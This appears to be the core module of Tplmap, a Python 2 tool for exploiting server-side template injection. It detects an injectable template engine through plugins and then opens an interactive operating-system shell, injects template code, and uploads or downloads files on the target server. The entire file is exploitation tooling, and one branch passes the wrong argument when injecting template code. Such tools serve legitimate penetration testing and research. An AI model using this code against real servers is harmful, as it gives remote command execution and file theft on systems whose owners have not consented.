from plugins.engines.mako import Mako
from plugins.engines.jinja2 import Jinja2
from plugins.engines.smarty import Smarty
from plugins.engines.twig import Twig
from plugins.engines.freemarker import Freemarker
from plugins.engines.velocity import Velocity
from plugins.engines.jade import Jade
from core.channel import Channel
from utils.loggers import log
from core.clis import Shell, MultilineShell

plugins = [
    Mako,
    Jinja2,
    Twig,
    Smarty,
    Freemarker,
    Velocity,
    Jade
]

def _print_injection_summary(channel):
    
    prefix = channel.data.get('prefix', '').replace('\n', '\\n') % ({'payload' : '' })
    render_tag = channel.data.get('render_tag').replace('\n', '\\n') % ({'payload' : '' })
    suffix = channel.data.get('suffix', '').replace('\n', '\\n') % ({'payload' : '' })
    
    log.info("""Tplmap identified the following injection point:

  Engine: %(engine)s
  Template: %(prefix)s%(render_tag)s%(suffix)s
  Context: %(context)s
  OS: %(os)s
  Capabilities:
    Code evaluation: %(eval)s 
    OS command execution: %(exec)s 
    File write: %(write)s 
    File read: %(read)s    
""" % ({
    'prefix': prefix,
    'render_tag': render_tag,
    'suffix': suffix,
    'context': 'text' if (not prefix and not suffix) else 'code',
    'engine': channel.data.get('engine').capitalize(),
    'os': channel.data.get('os', 'undetected'),
    'eval': 'no' if not channel.data.get('eval') else 'yes, %s code' % (channel.data.get('eval')),
    'exec': 'no' if not channel.data.get('exec') else 'yes',
    'write': 'no' if not channel.data.get('write') else 'yes',
    'read': 'no' if not channel.data.get('read') else 'yes',
}))    

def checkTemplateInjection(args):

    channel = Channel(args)
    current_plugin = None

    # Iterate all the available plugins until
    # the first template engine is detected.
    for plugin in plugins:
        current_plugin = plugin(channel)
        current_plugin.detect()

        if channel.data.get('engine'):
            break

    # Kill execution if no engine have been found
    if not channel.data.get('engine'):
        log.fatal("""Tested parameters appear to be not injectable. Try to increase '--level' value to perform more tests.""")
        return
        
    # Print injection summary
    _print_injection_summary(channel)

    # If actions are not required, prints the advices and exit
    if not any(
            f for f,v in args.items() if f in (
                'os_cmd', 'os_shell', 'upload', 'download', 'tpl_shell'
            ) and v
        ):
        
        log.info(
            """Rerun tplmap providing one of the following options:%(exec)s%(write)s%(read)s""" % (
                { 
                 'exec' : '\n    --os-cmd or --os-shell to access the underlying operating system' if channel.data.get('exec') else '',
                 'write' : '\n    --upload LOCAL REMOTE to upload files to the server' if channel.data.get('write') else '',
                 'read' : '\n    --download REMOTE LOCAL to download remote files' if channel.data.get('read') else '' 
                 }
            )
        )
    
        return

    # Execute operating system commands
    if channel.data.get('exec'):

        if args.get('os_cmd'):
            print current_plugin.execute(args.get('os_cmd'))
        elif args.get('os_shell'):
            log.info('Run commands on the operating system.')

            Shell(current_plugin.execute, '%s $ ' % (channel.data.get('os', ''))).cmdloop()


    # Execute operating system commands
    if channel.data.get('engine'):

        if args.get('tpl_code'):
            print current_plugin.inject(args.get('os_cmd'))
        elif args.get('tpl_shell'):
            log.info('Inject multi-line template code. Double empty line to send the data.')

            MultilineShell(current_plugin.inject, '%s $ ' % (channel.data.get('engine', ''))).cmdloop()

    # Perform file write
    if channel.data.get('write'):

        local_remote_paths = args.get('upload')

        if local_remote_paths:

            local_path, remote_path = local_remote_paths

            with open(local_path, 'rb') as f:
                data = f.read()

            current_plugin.write(data, remote_path)

    # Perform file read
    if channel.data.get('read'):

        remote_local_paths = args.get('download')
        
        if remote_local_paths:
            
            remote_path, local_path = remote_local_paths

            content = current_plugin.read(remote_path)

            with open(local_path, 'wb') as f:
                f.write(content)